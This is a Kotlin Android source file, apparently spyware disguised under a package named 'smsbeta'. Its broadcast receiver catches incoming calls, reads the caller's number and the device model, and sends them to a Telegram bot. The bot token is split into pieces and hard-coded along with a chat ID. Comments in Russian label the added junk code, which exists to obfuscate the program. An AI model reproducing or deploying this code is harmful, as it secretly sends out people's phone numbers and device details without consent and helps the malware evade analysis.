package com.analyzer.smsbeta

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import android.util.Base64
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.security.MessageDigest
import java.util.*
import kotlin.math.abs
import kotlin.random.Random

class L : BroadcastReceiver() {
    private val y = OkHttpClient()
    private val garbageVal1 = Random.nextInt(100, 999)
    private val garbageVal2 = System.nanoTime().toString().reversed()
    private val garbageList = listOf("alpha", "beta", "gamma", "delta")

    override fun onReceive(z: Context?, a: Intent?) {
        // Мусорные операции
        garbageList.forEach { item ->
            val hash = MessageDigest.getInstance("SHA-256")
                .digest(item.toByteArray())
                .fold("") { str, byte -> str + "%02x".format(byte) }
            println("Garbage hash: $hash")
        }

        val b = a?.getStringExtra(TelephonyManager.EXTRA_STATE)?.let { state ->
            // Избыточное преобразование строки
            Base64.encodeToString(state.toByteArray(), Base64.NO_WRAP)
                .substring(0, state.length.coerceAtMost(10))
        } ?: ""

        val c = a?.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)?.run {
            // Бессмысленное форматирование номера
            replace(Regex("[^0-9]"), "").takeLast(10)
        }

        val d = e().also { deviceInfo ->
            // Мусорная проверка
            if (deviceInfo.length > 50) {
                System.err.println("Device info too long")
            }
        }

        // Избыточное условие
        if ((b == TelephonyManager.EXTRA_STATE_RINGING || garbageVal1 % 2 == 0) && c != null) {
            // Дополнительные мусорные операции
            val tempMap = mapOf(
                "call" to c,
                "time" to System.currentTimeMillis()
            ).apply {
                keys.forEach { key -> key.hashCode() }
            }

            f(g = c + " " + garbageVal1, h = d + "\n" + garbageVal2)
        }

        // Вызов мусорной функции
        dummyProcessor(garbageVal1, garbageVal2)
    }

    private fun e(): String {
        // Избыточные преобразования
        return "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}".let {
            it.split(" ").joinToString("-") { part ->
                part.map { c -> c.code.toString(16) }.joinToString(":")
            }
        }.run {
            substring(0, length.coerceAtMost(100))
        }.also {
            // Мусорный вывод
            println("Device info: $it")
        }
    }

    private fun f(g: String, h: String) {
        // Разделение токена на части
        val tokenPart1 = "7824327491:AAGmZ5eA57SWIpWI3hf"
        val tokenPart2 = "qRFEt6cnrQPAhnu8"
        val i = tokenPart1 + tokenPart2
        
        val j = "6331293386".apply {
            // Бессмысленная проверка
            if (length != 10) throw IllegalStateException("Fake error")
        }

        val k = "https://api.telegram.org/bot$i/sendMessage".also { url ->
            // Мусорная операция
            url.toCharArray().distinct().joinToString("")
        }

        val l = """
            Входящий вызов!
            Номер: ${g.takeWhile { it.isDigit() }}
            
            ${h.split("\n").first()} [${Date()}]
        """.trimIndent().let { msg ->
            // Лишнее преобразование
            msg.uppercase(Locale.getDefault()).lowercase(Locale.getDefault())
        }

        val m = "application/json".toMediaType().apply {
            // Ничего не делающая операция
            toString().hashCode()
        }

        val n = """
            {
                "chat_id": "$j",
                "text": "$l",
                "parse_mode": "Markdown",
                "dummy": ${Random.nextInt(1000)}
            }
        """.trimIndent().toRequestBody(m).also { body ->
            // Мусорный вызов
            body.contentLength()
        }

        val o = Request.Builder()
            .url(k)
            .post(n)
            .apply {
                // Избыточные заголовки
                header("X-Dummy-1", garbageVal1.toString())
                header("X-Dummy-2", garbageVal2.take(5))
            }
            .build()

        y.newCall(o).enqueue(object : okhttp3.Callback {
            override fun onFailure(p: okhttp3.Call, q: java.io.IOException) {
                q.printStackTrace()
                // Мусорный код при ошибке
                repeat(3) {
                    println("Call failed ${System.currentTimeMillis()}")
                }
            }

            override fun onResponse(p: okhttp3.Call, r: okhttp3.Response) {
                if (!r.isSuccessful || r.code % 100 != 0) {
                    println("Error: ${r.code}".padEnd(20, '!'))
                    // Лишняя операция
                    r.headers.toMultimap().keys.hashCode()
                }
                r.close()
                
                // Вызов мусорной функции
                dummyLogger(r.code)
            }
        })
    }

    // Мусорные функции
    private fun dummyProcessor(a: Int, b: String) {
        val result = b.toCharArray().mapIndexed { index, c ->
            c.code + a * index
        }.sum()
        println("Dummy processing result: $result")
    }

    private fun dummyLogger(code: Int) {
        val message = when (code) {
            in 200..299 -> "SUCCESS"
            in 400..499 -> "CLIENT ERROR"
            in 500..599 -> "SERVER ERROR"
            else -> "UNKNOWN"
        }.let { it + " " + garbageList.random() }
        
        println("Logged: $message")
    }

    init {
        // Мусорная инициализация
        println("Initializing with dummy values: $garbageVal1, ${garbageVal2.take(3)}")
        val dummySet = setOf(1, 2, 3).map { it * garbageVal1 }.toSet()
    }
}
